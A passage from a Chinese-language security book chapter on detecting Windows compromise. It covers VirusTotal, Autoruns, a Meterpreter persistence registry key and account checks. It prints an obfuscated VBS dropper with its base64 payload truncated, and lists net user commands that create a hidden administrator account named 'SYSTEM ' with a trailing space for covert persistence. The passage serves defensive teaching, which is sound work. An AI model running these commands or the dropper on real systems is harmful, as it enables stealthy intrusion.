

![](img/181571ad74cba0e6a2f38fcd2658651e_282_0.png)

**图 9.14** 恶意文件的路径。

我能够将恶意文件上传到 VirusTotal，并找到恶意软件正在向其发送信标的 IP 地址。VirusTotal 非常适合分析可疑文件。如果个人用户想要查看文件的行为，或者你正在参加网络竞赛，它都非常有用。但如果你在国防部担任分析师，并且认为自己正在应对由国家支持的行为者，我不会使用它，因为行为者可以通过某些机制（如哈希）来确定他们的病毒是否已被检测到。这或多或少会向黑客透露你已察觉到他们的存在，而且你的工作场所可能也不希望文件信息进入公共领域（这可能与机密事项有关）。

![](img/181571ad74cba0e6a2f38fcd2658651e_282_1.png)

**图 9.15** Dropper 文件的 VirusTotal 分析。

另一个在系统中定位恶意活动的好方法是使用 Autoruns，这是 Sysinternals 套件中的另一个重要工具。该工具将帮助你精确定位哪些程序设置为在登录时启动，并且还允许你查看任何服务和计划任务。通过查看 Autoruns 中的大多数选项卡，你确实可以开始发现是否存在任何恶意活动迹象。而且，如果你正在参加网络竞赛或进行动态恶意软件分析，你可以在虚拟机（Windows XP、7 和 10 上运行良好）上运行恶意程序。最佳实践是在以仅主机模式运行的虚拟机中运行恶意软件。一些极度谨慎的人会进一步禁用 VMware Tools，以避免主机系统受到任何可能的污染。也存在识别 VMware 的恶意软件，因此如果恶意软件足够复杂，能够检测自身是否在虚拟环境中运行，卸载工具可能会有帮助，因为它在这些条件下可能不会运行。

![](img/181571ad74cba0e6a2f38fcd2658651e_283_0.png)

**图 9.16** Autoruns。

Autoruns 工具让我注意到在临时目录中运行的 VBS 脚本。因此，对于这个恶意软件，VBS 脚本进行了一些 base64 编码，可能是为了避免检测，然后它运行并创建一个文件，删除该文件，并在睡眠 5000 毫秒后重新运行该程序。其中一些技巧旨在逃避杀毒软件和其他网络安全相关检测机制的检测。重要的是要注意，Meterpreter 连接是加密的，因此受害者机器（本例中在美国）和攻击者机器（在朝鲜）之间的流量无法被分析。

```vbscript
' Malicious Visual Basic Script
Function fLJRUwXgXhr(ZMuuThUB)
    OyIbExEEyy = "<B64DECODE xmlns:dt=" & Chr(34) & "urn:schemas-microsoft-com:datatypes" & Chr(34) & " " & _
        "dt:dt=" & Chr(34) & "bin.base64" & Chr(34) & ">" & _
        ZMuuThUB & "</B64DECODE>"
    Set DCWQfIRV = CreateObject("MSXML2.DOMDocument.3.0")
    DCWQfIRV.LoadXML(OyIbExEEyy)
    fLJRUwXgXhr = DCWQfIRV.selectsinglenode("B64DECODE").nodeTypedValue
    Set DCWQfIRV = Nothing
End Function

Function QKDSXVJm()
    tvBgUHI... = "TVqQAAMAAAAEAAAA..."
    Dim erDXcvnqaq
    Set erDXcvnqaq = CreateObject("Scripting.FileSystemObject")
    Dim OVUIDeHteq
    xCHN... = erDXcvnqaq.GetSpecialFolder(2)
    xCHN... = "" & erDXcvnqaq.GetTempName()
    erDXcvnqaq.CreateFolder(xCHN...)
    apo... = xCHN... & "\\...exe"
    Dim XTeOGRACKINyHr
    Set XTeOGRACKINyHr = CreateObject("WScript.Shell")
    CzzZZOE... = fLJRUwXgXhr(tvBgUHI...)
    Set qaD... = CreateObject("ADODB.Stream")
    qaD...Type = 1
    qaD...Open
    qaD...Write CzzZZOE...
    qaD...SaveToFile apo..., 2
    XTeOGRACKINyHr.Run apo..., 0, True
    erDXcvnqaq.DeleteFile(apo...)
    erDXcvnqaq.DeleteFolder(xCHN...)
End Function

Do
    QKDSXVJm
    WScript.Sleep 5000
Loop
```

**图 9.17** 恶意 Visual Basic 脚本。

通过检查 Autoruns 提供给我的路径，我能够在 Windows 目录下的临时目录中的文件系统上找到该脚本。当我把 VBS 脚本上传到 VirusTotal 时，该网站能够提供脚本运行时创建的可执行文件名称 prLNUjAgGAE.exe。它还让我知道，当该文件被大量检测引擎扫描时，它是恶意的。黑客还可以使用更高级的技术来提高其逃避检测的能力。

![](img/181571ad74cba0e6a2f38fcd2658651e_284_0.png)

**图 9.18** 恶意 VBS 文件的 VirusTotal 分析。

需要澄清的是，攻击者的原始入口点 PowerShell.exe 不会被 Autoruns 检测到，但可以用 Process Explorer 检测到。只有在我运行持久化命令时，VBS 脚本和 dropper prLNUjAgGAE.exe 才会被创建。Meterpreter 中的持久化命令报告说，它在 HKLM\Software\Microsoft\Windows\CurrentVersion\Run 注册表项中创建了持久化的启动项。然而，这是一个非常常见的注册表项，进行取证分析的人通常会检查此启动项，而且看起来 HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run 才是注册表项的实际位置。我能够使用 Autoruns 工具检测到这个位置。它会检测 Windows 中将要自动启动的程序，对于动态恶意软件分析极其有用。

![](img/181571ad74cba0e6a2f38fcd2658651e_284_1.png)

**图 9.19** 恶意 VBS 文件的注册表项。

## 检查账户

所以，许多网络入侵分析师或威胁猎手会告诉你，要查找系统的活动连接，并仔细检查进程，就像我们在本章第一部分所做的那样。黑客进入并尽可能长时间地停留在你的系统或网络中，这是极其常见的。但是，根据开放的端口和正在运行的服务，攻击者总是有可能创建凭据，以便他们可以离开后再回来。因此，检查系统上的账户绝不是一个坏主意。这一步也应该成为你的事件响应计划的一部分，如果你获得了 RAM 镜像，你还可以查看你的 Windows 账户，就像你在第 1 章中可能看到的那样，当时我使用 Volatility 框架提取密码哈希（在对机器进行物理攻击期间）。

在 Meterpreter 中键入 shell 命令或访问 Windows 上的命令提示符后，可以使用以下命令列表来创建“SYSTEM”账户，尽管已经存在一个任何用户都无法使用的 SYSTEM 账户。SYSTEM 是 Windows 上可能的最高权限级别，甚至高于管理员账户。我们在这里所做的实际上只是创建一个标准账户，并在一个已存在但无法使用的实际账户名称中添加一个空格，然后将其添加到管理员组。这里的想法是使用一个不会引起注意的账户，并且由于 SYSTEM 账户确实存在（但不显示），因此可能不会被经验不足的分析 Windows 账户的人发现。我以前在大学生网络防御竞赛（CCDC）中作为红队成员使用过这个技巧，它在为期两天的比赛中一直留在系统上，并允许我随意登录，在竞赛规则允许的范围内对学生的机器进行破坏。有些学生就读于全国最好的网络安全学校，但他们没有注意到“SYSTEM ”实际上并不属于系统。以下是我在系统上运行的命令，用于创建“SYSTEM”账户并将其添加到管理员组：

```text
net user SYSTEM P@ssw0rd /add                 -> will not work because it says the account exists.
net user                                      -> shows a list of users but no SYSTEM account.
net user "SYSTEM " P@ssw0rd /add             -> adds a standard account named "SYSTEM " with a space
net localgroup administrators "SYSTEM " /add  -> adds the "SYSTEM " account to administrators
net user                                      -> shows a list of users including a "SYSTEM " account
```

![](img/181571ad74cba0e6a2f38fcd2658651e_285_0.png)

**图 9.20** 账户操纵以添加“SYSTEM”。

